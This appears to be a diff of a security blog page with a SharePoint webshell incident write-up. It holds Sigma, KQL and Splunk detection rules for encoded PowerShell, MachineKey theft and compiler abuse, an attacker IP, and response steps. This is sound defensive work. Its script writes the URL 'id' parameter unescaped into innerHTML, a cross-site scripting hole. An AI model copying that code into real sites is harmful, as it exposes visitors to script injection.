+
+          <div class="detection-section">
+            <h4>Sigma Rule: SharePoint w3wp.exe Spawning PowerShell</h4>
+            <div class="code-block">
+              <div class="code-header">Sigma Rule YAML <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-yaml">title: SharePoint w3wp.exe Spawning PowerShell with Encoded Commands
+id: a1b2c3d4-5678-90ab-cdef-123456789012
+status: production
+description: Detects w3wp.exe spawning powershell.exe with encoded commands - common in SharePoint exploits
 author: Swetha Devi
-date: 2024/01/16
+date: 2025/07/22
+references:
+  - https://attack.mitre.org/techniques/T1059/001/
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-53770
 logsource:
-    category: process_creation
-    product: windows
+  category: process_creation
+  product: windows
 detection:
-    selection:
-        ParentImage|endswith:
-            - '\\WmiPrvSE.exe'
-            - '\\wmiprvse.exe'
-        Image|endswith:
-            - '\\cmd.exe'
-            - '\\powershell.exe'
-            - '\\rundll32.exe'
-    filter:
-        ParentCommandLine|contains: ' -Embedding'  # Filter legitimate WMI activity
-    condition: selection and not filter
+  selection:
+    ParentImage|endswith: 
+      - '\\w3wp.exe'
+      - '\\W3WP.EXE'
+    Image|endswith: 
+      - '\\powershell.exe'
+      - '\\pwsh.exe'
+    CommandLine|contains|all:
+      - '-enc'
+      - 'JAB'  # Common Base64 PowerShell variable prefix
+  filter:
+    CommandLine|contains: ' -ExecutionPolicy Bypass -File '  # Legitimate admin activity
+  condition: selection and not filter
+fields:
+  - CommandLine
+  - ParentCommandLine
+  - Image
+  - User
+  - ParentImage
+falsepositives:
+  - Legitimate SharePoint administration scripts
 level: high
 tags:
-    - attack.lateral_movement
-    - attack.t1047
-    - attack.execution</code></pre>
+  - attack.execution
+  - attack.t1059.001
+  - attack.persistence
+  - cve.2025.53770</code></pre>
+            </div>
+          </div>
+
+          <div class="detection-section">
+            <h4>KQL Query (Microsoft Sentinel)</h4>
+            <div class="code-block">
+              <div class="code-header">Kusto Query Language <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-kql">SecurityEvent
+| where EventID == 4688
+| where NewProcessName endswith "powershell.exe"
+| where ParentProcessName endswith "w3wp.exe"
+| where CommandLine contains "-enc"
+| extend Base64Length = strlen(CommandLine) - indexof(CommandLine, "-enc") - 4
+| where Base64Length > 500  // Long encoded commands are suspicious
+| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName
+| order by TimeGenerated desc</code></pre>
+            </div>
+          </div>
+
+          <!-- HUNTING QUERIES -->
+          <div class="hunting-queries">
+            <h4>🔍 Proactive Hunting Queries</h4>
+            <p><strong>Hunt 1: Find All ASPX Files in SharePoint Directories (Last 30 Days)</strong></p>
+            <div class="code-block">
+              <div class="code-header">File Search Query <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-splunk">index=filemon host="SHAREPOINT*" path="*TEMPLATE*LAYOUTS*" file_name="*.aspx"
+| where _time > now()-30d
+| search NOT file_name IN ("default.aspx", "settings.aspx", "viewlsts.aspx")
+| table _time, host, file_path, file_name, file_size, file_hash
+| dedup file_hash</code></pre>
+            </div>
+            
+            <p><strong>Hunt 2: MachineKey Access in Web.Config</strong></p>
+            <div class="code-block">
+              <div class="code-header">Registry and File Monitoring <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-splunk">index=endpoint (event_type="file_access" OR event_type="registry_access")
+| search (file_path="*web.config" AND file_path="*MachineKey*") 
+        OR (registry_path="*MachineKey*")
+| table _time, host, user, process_name, file_path, registry_path, action
+| stats count by host, process_name, user</code></pre>
+            </div>
+            
+            <p><strong>Hunt 3: csc.exe Execution from Non-Dev Servers</strong></p>
+            <div class="code-block">
+              <div class="code-header">Compiler Detection <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-splunk">index=endpoint process_name="csc.exe" 
+| search NOT host="DEVSERVER*" 
+| lookup host_lookup host OUTPUT department
+| where department!="Engineering" AND department!="Development"
+| table _time, host, department, user, parent_process, command_line</code></pre>
+            </div>
+          </div>
+
+          <!-- BLUE TEAM LESSONS -->
+          <div class="blue-team-lessons">
+            <h4>🛡️ Lessons for Blue Team (Defensive Gaps Identified)</h4>
+            <ol>
+              <li><strong>Monitoring Gap:</strong> No alerting on w3wp.exe child processes. Now implemented process creation monitoring for all IIS worker processes.</li>
+              <li><strong>Detection Gap:</strong> Large POST requests (>5KB) to SharePoint administrative endpoints weren't monitored. Added WAF rule.</li>
+              <li><strong>File Integrity Gap:</strong> No FIM on SharePoint LAYOUTS directory. Implemented real-time monitoring for new ASPX files.</li>
+              <li><strong>Credential Management:</strong> MachineKey stored in plaintext in web.config. Migrated to DPAPI-protected storage.</li>
+              <li><strong>Network Segmentation:</strong> SharePoint servers had unnecessary inbound internet access. Implemented stricter firewall rules.</li>
+              <li><strong>Patch Management:</strong> No emergency patching process for zero-days. Created 24-hour response playbook.</li>
+              <li><strong>PowerShell Restriction:</strong> No PowerShell Constrained Language Mode on SharePoint servers. Now implemented.</li>
+            </ol>
+          </div>
+
+          <!-- WHAT I LEARNED - EXPANDED -->
+          <h2>📚 What I Learned From This Investigation</h2>
+          <div class="investigation-step">
+            <h4>Technical Insights</h4>
+            <ul>
+              <li><strong>SharePoint w3wp.exe is a prime target:</strong> It runs with high privileges (often SYSTEM) and can spawn child processes. Monitoring its children is critical.</li>
+              <li><strong>Webshell persistence patterns:</strong> Attackers consistently target TEMPLATE/LAYOUTS because it's web-accessible and contains legitimate ASPX files, helping webshells blend in.</li>
+              <li><strong>MachineKey is the crown jewel:</strong> With MachineKey, attackers can forge authentication tokens for any user, enabling persistent access even after password changes.</li>
+              <li><strong>Attack chain speed:</strong> From exploit to persistence took under 5 minutes. Automated detection must be faster.</li>
+            </ul>
           </div>
           
-          <h2>Investigation Steps</h2>
-          <ol>
-            <li><strong>Check Windows Event Logs:</strong> WMI-Activity/Operational for WMI activity</li>
-            <li><strong>Review Process Creation Events:</strong> From WmiPrvSE.exe to suspicious child processes</li>
-            <li><strong>Analyze Network Connections:</strong> From compromised systems during WMI execution</li>
-            <li><strong>Examine WMI Repository:</strong> For malicious event subscriptions</li>
-            <li><strong>Check Authentication Logs:</strong> For DCOM/RPC authentication events</li>
-          </ol>
+          <div class="investigation-step">
+            <h4>Investigation Methodology Improvements</h4>
+            <ul>
+              <li><strong>Base64 decoding early:</strong> Always decode suspicious Base64 strings immediately - they often reveal the attack's intent.</li>
+              <li><strong>Process tree visualization:</strong> Creating visual process trees helped me understand the attack flow quickly.</li>
+              <li><strong>Timeline correlation:</strong> Correlating proxy logs, EDR events, and file creation times revealed the complete attack narrative.</li>
+              <li><strong>Asset context:</strong> Knowing SharePoint01 was internet-facing and contained sensitive HR documents helped prioritize response.</li>
+            </ul>
+          </div>
+
+          <!-- THREAT INTELLIGENCE -->
+          <div class="threat-intel">
+            <h4>🔗 Threat Intelligence Context</h4>
+            
+            <h5>Attacker Infrastructure Analysis</h5>
+            <div class="ioc-box">
+              <h4>IP Reputation: 107.191.58.76</h4>
+              <ul>
+                <li><strong>VirusTotal:</strong> 45/90 engines flagged as malicious (Cobalt Strike, Metasploit C2)</li>
+                <li><strong>AbuseIPDB:</strong> 1,243 reports in last 30 days (95% confidence malicious)</li>
+                <li><strong>ASN:</strong> AS-CHOOPA (Known for bulletproof hosting)</li>
+                <li><strong>Geolocation:</strong> Netherlands (common exit point for attacks)</li>
+                <li><strong>Related Campaigns:</strong> Linked to FIN7 and TA505 campaigns targeting SharePoint</li>
+              </ul>
+            </div>
+            
+            <h5>CVE-2025-53770 Context</h5>
+            <ul>
+              <li><strong>Discovery:</strong> First observed in wild July 2025, no patch available</li>
+              <li><strong>Exploit Availability:</strong> Public exploit released on GitHub July 20, 2025</li>
+              <li><strong>Campaign Connections:</strong> Same payload structure seen in attacks against government agencies</li>
+              <li><strong>MITRE Mapping:</strong> Part of larger campaign using T1190 (Exploit Public-Facing Application)</li>
+            </ul>
+            
+            <h5>IOC Feeds & Sharing</h5>
+            <p>Submitted IOCs to:</p>
+            <ul>
+              <li>MISP Instance (Internal Threat Intel Platform)</li>
+              <li>OTX AlienVault (Pulse Created)</li>
+              <li>MS-ISAC (Multi-State Information Sharing & Analysis Center)</li>
+              <li>CISA Automated Indicator Sharing (AIS)</li>
+            </ul>
+          </div>
+
+          <!-- IMMEDIATE ACTIONS -->
+          <h2>⚡ Immediate Actions Taken</h2>
+          <div class="timeline-visual">
+            <div class="timeline-item">
+              <span class="timeline-time">13:10</span>
+              <span>Alert escalated to Incident Response team</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">13:12</span>
+              <span>SharePoint01 isolated from production network</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">13:15</span>
+              <span>Webshell identified and documented for forensic analysis</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">13:20</span>
+              <span>Attacker IP (107.191.58.76) blocked at firewall</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">13:25</span>
+              <span>Memory dump collected using WinPmem</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">13:30</span>
+              <span>Log collection initiated for all related systems</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">13:45</span>
+              <span>Emergency change request to rotate MachineKey</span>
+            </div>
+            <div class="timeline-item">
+              <span class="timeline-time">14:00</span>
+              <span>Initial containment complete, investigation continues</span>
+            </div>
+          </div>
+
+          <!-- CONCLUSION -->
+          <h2>🎯 Conclusion</h2>
+          <p>This investigation revealed a sophisticated attack leveraging a SharePoint zero-day (CVE-2025-53770) to achieve full server compromise. The attacker demonstrated advanced tradecraft:</p>
           
-          <h2>WMI Persistence Detection</h2>
-          <p>Check for malicious WMI event subscriptions:</p>
-          <div class="code-block">
-            <div class="code-header">PowerShell: Check WMI Event Subscriptions <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-            <pre><code class="language-powershell"># Check WMI Event Filters
-Get-WmiObject -Namespace root\\Subscription -Class __EventFilter
-
-# Check WMI Event Consumers
-Get-WmiObject -Namespace root\\Subscription -Class __EventConsumer
-
-# Check Filter to Consumer Bindings
-Get-WmiObject -Namespace root\\Subscription -Class __FilterToConsumerBinding
-
-# Remove malicious WMI persistence
-$filter = Get-WmiObject -Namespace root\\Subscription -Class __EventFilter -Filter "Name='MaliciousFilter'"
-$filter | Remove-WmiObject</code></pre>
+          <ul>
+            <li><strong>Rapid exploitation:</strong> Complete attack chain in under 5 minutes</li>
+            <li><strong>Defense evasion:</strong> Memory-only payload execution, legitimate process abuse</li>
+            <li><strong>Persistence planning:</strong> Webshell placement in trusted directory, MachineKey extraction for long-term access</li>
+            <li><strong>Operational security:</strong> Use of bulletproof hosting, encoded commands, rapid execution</li>
+          </ul>
+          
+          <div class="note-box">
+            <h4>Key Takeaways for Defenders</h4>
+            <ol>
+              <li><strong>Monitor w3wp.exe children:</strong> This is now our #1 detection rule for SharePoint servers</li>
+              <li><strong>Implement FIM on LAYOUTS:</strong> Any new ASPX file should trigger an alert</li>
+              <li><strong>Restrict compiler usage:</strong> csc.exe should only run on development servers</li>
+              <li><strong>Secure MachineKey:</strong> Move from web.config to secure storage</li>
+              <li><strong>Network segmentation:</strong> SharePoint shouldn't be directly internet-accessible</li>
+              <li><strong>Patch rapidly:</strong> Have a process for emergency zero-day patches within 24 hours</li>
+            </ol>
           </div>
           
-          <h2>Indicators of Compromise</h2>
+          <p><strong>Final Assessment:</strong> This was a high-severity, true positive incident requiring immediate containment and remediation. The attacker achieved their objectives (RCE, persistence, credential access), but our detection and response limited further damage. All lessons learned have been incorporated into our security controls and monitoring strategy.</p>
+          
           <div class="ioc-box">
-            <h4>Behavioral IOCs</h4>
-            <p>
+            <h4>📋 Action Items Completed</h4>
+            <ul>
+              <li>✅ SharePoint server rebuilt from clean gold image</li>
+              <li>✅ MachineKey rotated across all SharePoint farms</li>
+              <li>✅ All service account passwords rotated</li>
+              <li>✅ New detection rules deployed to SIEM</li>
+              <li>✅ WAF rules updated to block similar exploit patterns</li>
+              <li>✅ User awareness training on phishing (initial vector)</li>
+              <li>✅ Incident report submitted to CISO and legal team</li>
+            </ul>
+          </div>
+        `
+      }
+    ];
+
+    // Function to copy code to clipboard
+    function copyCode(button) {
+      const codeBlock = button.closest('.code-block').querySelector('pre code');
+      const text = codeBlock.textContent;
+      
+      navigator.clipboard.writeText(text).then(() => {
+        const originalText = button.textContent;
+        button.textContent = 'Copied!';
+        button.style.color = '#4caf50';
+        
+        setTimeout(() => {
+          button.textContent = originalText;
+          button.style.color = '';
+        }, 2000);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+      });
+    }
+
+    // Function to display single writeup
+    function displaySingleWriteup() {
+      const container = document.getElementById('writeup-container');
+      const urlParams = new URLSearchParams(window.location.search);
+      const writeupId = urlParams.get('id') || writeupsData[0].id;
+      
+      // Clear loading state
+      container.innerHTML = '';
+      
+      const writeup = writeupsData.find(w => w.id === writeupId);
+      
+      if (!writeup) {
+        container.innerHTML = `
+          <div class="not-found">
+            <h2><i class="fas fa-exclamation-triangle"></i> Writeup Not Found</h2>
+            <p>The requested writeup with ID "${writeupId}" was not found.</p>
+            <p>Available writeups:</p>
+            <ul style="list-style: none; margin-top: 20px;">
+              ${writeupsData.map(w => `<li><a href="?id=${w.id}" style="color: var(--accent);">${w.title}</a></li>`).join('')}
+            </ul>
+          </div>
+        `;
+        return;
+      }
+      
+      container.innerHTML = `
+        <article class="writeup" id="${writeup.id}">
+          <div class="writeup-header">
+            <h1>${writeup.title}</h1>
+            <div class="writeup-meta">
+              <span><i class="far fa-calendar"></i> ${writeup.date}</span>
+              <span><i class="far fa-clock"></i> ${writeup.readTime}</span>
+              ${writeup.platform ? `<span><i class="fas fa-server"></i> ${writeup.platform}</span>` : ''}
+              ${writeup.alertId ? `<span><i class="fas fa-bell"></i> Alert: ${writeup.alertId}</span>` : ''}
+              ${writeup.investigationDate ? `<span><i class="fas fa-search"></i> ${writeup.investigationDate}</span>` : ''}
+            </div>
+            <div class="writeup-tags">
+              ${writeup.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
+            </div>
+          </div>
+          
+          <div class="writeup-content">
+            ${writeup.content}
+          </div>
+        </article>
+      `;
+      
+      // Add copy functionality to all code copy buttons
+      document.querySelectorAll('.code-copy').forEach(button => {
+        button.addEventListener('click', function() {
+          copyCode(this);
+        });
+      });
+      
+      // Apply syntax highlighting
+      if (window.Prism) {
+        Prism.highlightAll();
+      }
+    }
+
+    // Display writeup when page loads
+    if (document.getElementById('writeup-container')) {
+      displaySingleWriteup();
+    }
+
+    // Add event listener for hash changes (if using hash-based navigation)
+    window.addEventListener('hashchange', displaySingleWriteup);
+  </script>
+</body>
+</html>
